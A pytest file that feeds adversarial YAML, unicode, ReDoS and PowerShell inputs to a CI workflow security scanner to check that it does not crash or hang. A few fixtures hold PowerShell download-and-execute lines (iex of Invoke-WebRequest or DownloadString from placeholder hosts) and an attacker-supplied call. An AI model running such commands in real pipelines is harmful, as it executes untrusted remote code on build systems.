"""Adversarial input tests — scanner as attack surface.

From the pre-mortem analysis: the scanner processes attacker-controlled YAML.
A malformed or adversarially crafted pipeline file must not cause the scanner to:
  - Crash with an unhandled exception
  - Hang (resource exhaustion via YAML bomb)
  - Produce corrupted output
  - Silently return zero findings AND zero ENGINE-ERR on a file it failed to parse

These are not traditional fuzz tests (no mutation engine) but a structured
adversarial input set covering the known dangerous input classes for YAML parsers
and regex engines.

Each test enforces a hard 10-second timeout (via the fixture) and a soft
"must return a list" contract.
"""

from __future__ import annotations

import signal
import threading
from pathlib import Path

import pytest

from taintly.engine import scan_file
from taintly.models import Platform, RegexPattern, Rule, Severity

FIXTURES_EDGE = Path(__file__).parent.parent / "fixtures" / "github" / "edge_cases"


# =============================================================================
# Timeout helper — enforce scanner must complete within N seconds
# =============================================================================


class _TimeoutError(Exception):
    pass


def _run_with_timeout(fn, seconds: int = 10):
    """Run fn() in a thread; raise _TimeoutError if it exceeds seconds."""
    result = [None]
    exc = [None]

    def _target():
        try:
            result[0] = fn()
        except Exception as e:
            exc[0] = e

    t = threading.Thread(target=_target, daemon=True)
    t.start()
    t.join(timeout=seconds)
    if t.is_alive():
        raise _TimeoutError(f"Scanner did not complete within {seconds}s — possible hang")
    if exc[0] is not None:
        raise exc[0]
    return result[0]


def _all_github_rules():
    from taintly.rules.registry import load_all_rules
    rules = load_all_rules()
    return [r for r in rules if r.platform == Platform.GITHUB]


# =============================================================================
# Adversarial YAML inputs
# =============================================================================

ADVERSARIAL_INPUTS = {
    "empty_string": "",
    "whitespace_only": "   \n   \n   ",
    "null_bytes": "name: Test\x00\non: push\x00\n",
    "very_long_line": "name: " + "A" * 100_000,
    # 500 levels produces ~253k chars; the unconditional length cap in
    # _safe_search (see taintly/models.py) bounds the input regardless
    # of thread context, so this completes in well under a second.
    "deeply_nested_dicts": "\n".join(
        f"{'  ' * i}key{i}:" for i in range(500)
    ),
    "yaml_anchor_bomb_shallow": (
        # A shallow anchor bomb — expands but not catastrophically
        "a: &a [1, 2, 3, 4, 5]\n"
        "b: &b [*a, *a, *a, *a, *a]\n"
        "c: &c [*b, *b, *b, *b, *b]\n"
        "d: [*c, *c, *c, *c, *c]\n"
    ),
    "binary_like_content": bytes(range(256)).decode("latin-1"),
    "only_comments": "# This is a comment\n# Another comment\n# No YAML keys\n",
    "malformed_yaml_colon": ": value without key\n:another: broken\n",
    "unicode_rtl": "name: \u202eevil\u202c\non: push\n",
    "unicode_zalgo": "name: T\u0337e\u0334s\u0336t\non: push\n",
    "repeated_keys": "name: first\nname: second\nname: third\non: push\n",
    "tab_indentation": "name:\tTest\non:\tpush\njobs:\n\tbuild:\n\t\truns-on: ubuntu-latest\n",
    "mixed_line_endings": "name: Test\r\non: push\r\npermissions:\n  contents: read\r\n",
    "no_newline_at_eof": "name: Test\non: push",
    "github_expression_nesting": (
        "name: Test\n"
        "on: push\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo ${{ toJSON(fromJSON(toJSON(github))) }}\n"
    ),
    "extremely_many_steps": (
        "name: Test\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
        + "".join(f"      - run: echo step{i}\n" for i in range(1000))
    ),
    "uses_with_no_action": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses:\n",
    "permissions_none": "name: T\non: push\npermissions: {}\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
    # UTF-8 BOM at the start of the file. The YAML spec strips it;
    # a regex that anchors on ``^name:`` would miss the first key if
    # we don't normalise first.
    "bom_prefixed": "﻿name: Test\non: push\n",
    # Mix of CR and LF separators. _split_into_job_segments() uses
    # splitlines(), which handles both, but a regex that hardcodes
    # ``\n`` would desync here.
    "crlf_only": "name: Test\r\non: push\r\njobs:\r\n  b:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - run: echo ok\r\n",
    "cr_only_old_mac": "name: Test\ron: push\rjobs:\r  b:\r    runs-on: ubuntu-latest\r    steps:\r      - run: echo ok\r",
    # YAML merge key ``<<: *anchor`` — legal in YAML 1.1, technically
    # removed in 1.2 but real workflows (and GitHub) still parse it.
    "yaml_merge_key": (
        ".defaults: &d\n"
        "  runs-on: ubuntu-latest\n"
        "  timeout-minutes: 5\n"
        "jobs:\n"
        "  a:\n"
        "    <<: *d\n"
        "    steps:\n"
        "      - run: echo ok\n"
    ),
    # Anchor + alias with a *run:* body — the alias doesn't textually
    # duplicate the script, so the regex must survive the reference
    # form without matching the anchor definition twice.
    "yaml_alias_run": (
        "jobs:\n"
        "  a:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - &s\n"
        "        run: echo ok\n"
        "  b:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - *s\n"
    ),
    # YAML tag on a scalar — ``!!str true`` coerces to string "true".
    "yaml_explicit_tag": "on: !!str push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
    # PowerShell ``iex`` / ``Invoke-Expression`` shapes — SEC6-GH-007
    # has a history of FPs on benign iex() usage. These inputs target
    # the rule's regex, not the engine, but a crash here would surface
    # either way.
    "powershell_iex_literal": (
        "jobs:\n  b:\n    runs-on: windows-latest\n    steps:\n"
        "      - run: iex 'Get-Service'\n"
        "        shell: pwsh\n"
    ),
    "powershell_iex_fetch": (
        "jobs:\n  b:\n    runs-on: windows-latest\n    steps:\n"
        "      - run: iex (Invoke-WebRequest -Uri https://example.com/x.ps1).Content\n"
        "        shell: pwsh\n"
    ),
    "powershell_iex_with_pipe": (
        "jobs:\n  b:\n    runs-on: windows-latest\n    steps:\n"
        "      - run: (New-Object Net.WebClient).DownloadString('http://x/y.ps1') | iex\n"
        "        shell: pwsh\n"
    ),
    "powershell_call_operator": (
        "jobs:\n  b:\n    runs-on: windows-latest\n    steps:\n"
        "      - run: & $env:ATTACKER\n"
        "        shell: pwsh\n"
    ),
    # Heredoc with/without quoted terminator — bash expands variables
    # inside ``<<EOF`` but NOT ``<<'EOF'``. The taint analyzer doesn't
    # distinguish today; both should parse without crashing.
    "heredoc_unquoted": (
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - run: |\n"
        "          cat <<EOF\n"
        "          title=$PR_TITLE\n"
        "          EOF\n"
    ),
    "heredoc_quoted": (
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - run: |\n"
        "          cat <<'EOF'\n"
        "          literal $PR_TITLE not expanded\n"
        "          EOF\n"
    ),
    # Empty steps array — a workflow with ``steps: []`` is legal.
    "empty_steps_array": (
        "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps: []\n"
    ),
    # Empty jobs block.
    "empty_jobs_block": "on: push\njobs: {}\n",
    # Surrogate-half code points — invalid UTF-8 encoded via surrogate
    # escape, can crash regex libraries that assume valid unicode.
    "surrogate_half": "name: A\udcffB\non: push\n",
}


@pytest.mark.parametrize("name,content", list(ADVERSARIAL_INPUTS.items()), ids=list(ADVERSARIAL_INPUTS.keys()))
def test_scanner_survives_adversarial_input(name, content, github_rules):
    """Scanner must not crash, hang, or raise on any adversarial input.

    Contract: scan_file() must either:
    a) Return a list (possibly empty, possibly with ENGINE-ERR findings), OR
    b) Raise a known, handled exception type

    It must NOT:
    - Hang for more than 10 seconds
    - Raise an unhandled exception
    - OOM (enforced by the test runner's memory limit in CI)
    """
    def _run():
        return scan_file("adversarial_test.yml", rules=github_rules, _content=content)

    try:
        result = _run_with_timeout(_run, seconds=10)
    except _TimeoutError as e:
        pytest.fail(f"[{name}] HANG: {e}")
    except MemoryError:
        pytest.fail(f"[{name}] OOM: scanner ran out of memory on adversarial input")

    assert isinstance(result, list), (
        f"[{name}] scan_file must return a list, got {type(result).__name__!r}"
    )


@pytest.mark.parametrize("name,content", list(ADVERSARIAL_INPUTS.items()), ids=list(ADVERSARIAL_INPUTS.keys()))
def test_scanner_output_is_serializable(name, content, github_rules):
    """All findings from adversarial inputs must be JSON-serializable.

    A non-serializable finding would silently corrupt --format json output.
    """
    import json

    findings = scan_file("adversarial_test.yml", rules=github_rules, _content=content)
    for f in findings:
        try:
            json.dumps(f.to_dict())
        except (TypeError, ValueError) as e:
            pytest.fail(
                f"[{name}] Finding from rule {f.rule_id!r} is not JSON-serializable: {e}\n"
                f"Finding: {f.to_dict()}"
            )


# =============================================================================
# ReDoS candidates — patterns that could hang on adversarial regex input
# =============================================================================

REDOS_CANDIDATES = [
    # Exponential backtracking triggers for common patterns
    "a" * 50 + "b",                          # Non-matching after long prefix
    "${{" + " " * 10000 + "}}",              # Long expression
    "uses: " + "a" * 10000 + "@v1",         # Very long action name
    "echo " + "A" * 50000,                   # Long run: line
    "${{ " + "github.event." * 1000 + " }}", # Deep context chain
]


@pytest.mark.parametrize("payload", REDOS_CANDIDATES, ids=[f"redos_{i}" for i in range(len(REDOS_CANDIDATES))])
def test_no_redos_on_long_inputs(payload, github_rules):
    """Patterns must complete within 10s on inputs designed to trigger backtracking."""
    def _run():
        return scan_file("redos_test.yml", rules=github_rules, _content=payload)

    try:
        _run_with_timeout(_run, seconds=10)
    except _TimeoutError:
        pytest.fail(
            f"Possible ReDoS: scanner hung on input of length {len(payload)}.\n"
            f"Input prefix: {payload[:100]!r}"
        )
